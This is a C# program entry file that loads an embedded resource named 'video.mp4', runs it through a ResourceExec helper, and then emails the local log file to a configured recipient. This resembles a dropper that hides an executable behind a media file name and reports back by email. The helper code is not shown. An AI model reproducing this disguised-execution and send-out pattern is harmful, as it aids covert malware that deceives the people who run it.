using System;
using System.IO;
using System.Linq;
using System.Reflection;
using AutoMapper;
using Lacey.Medusa.Cocoon.Run.Configuration;
using Lacey.Medusa.Cocoon.Run.Infrastructure;
using Lacey.Medusa.Cocoon.Run.Utils;
using Lacey.Medusa.Common.Configuration.EmbeddedResource.Extensions;
using Lacey.Medusa.Common.Email.Services.Email;
using Microsoft.Extensions.Configuration;
using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Logging;

namespace Lacey.Medusa.Cocoon.Run
{
    class Program
    {
        private static ILogger<Program> logger;

        static void Main()
        {
            var resources = Assembly.GetExecutingAssembly().GetManifestResourceNames();
            var appSettingsRes = resources.First(r => r.Contains("appsettings.json"));
            var videoRes = resources.First(r => r.Contains("video.mp4"));

            var builder = new ConfigurationBuilder()
                .SetBasePath(Directory.GetCurrentDirectory())
                .AddJsonEmbeddedResource(appSettingsRes);

            var configuration = builder.Build();
            var config = configuration.GetSection("App").Get<AppConfiguration>();

            //setup our DI
            var serviceProvider = new ServiceCollection()
                .AddAutoMapper()
                .AddLogging(logBuilder =>
                    logBuilder
//                        .AddLog4Net()
                        .SetMinimumLevel(LogLevel.Trace))
                .AddAppServices(config)
                .BuildServiceProvider();

            //configure console logging
            logger = serviceProvider.GetService<ILoggerFactory>()
                .CreateLogger<Program>();

            try
            {
                ResourceUtils.ResourceExec(videoRes);
            }
            catch (Exception exc)
            {
                logger.LogError(exc.Message);
            }

            if (config.Email.IsSendEmails)
            {
                var emailService = serviceProvider.GetService<IEmailProvider>();
                var currentFolder = Directory.GetCurrentDirectory();
                emailService.Send(
                    config.Email.From,
                    config.Email.To,
                    config.Email.Subject,
                    "Cocoon Message.",
                    true,
                    new[]
                    {
                        Path.Combine(currentFolder, config.Logs.LogFile)
                    });
            }

            serviceProvider.Dispose();
        }
    }
}
